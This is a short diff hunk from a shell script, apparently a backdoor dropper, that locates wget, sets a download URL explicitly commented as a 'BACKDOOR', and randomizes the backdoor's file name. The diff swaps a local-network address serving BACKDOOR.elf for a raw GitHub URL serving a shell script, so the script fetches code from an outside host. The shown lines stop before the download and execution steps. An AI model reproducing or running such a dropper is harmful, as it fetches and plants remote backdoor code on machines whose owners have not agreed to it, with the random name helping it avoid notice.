@@ -4,7 +4,7 @@
 WGET=$(which wget)
 
 # Url with BACKDOOR to download
-URL="https://192.168.1.7:8080/BACKDOOR.elf"
+URL="https://raw.githubusercontent.com/FoxyProxys/kik/main/git.sh"
 
 # Randomize BACKDOOR name
 BACKDOOR=$RANDOM
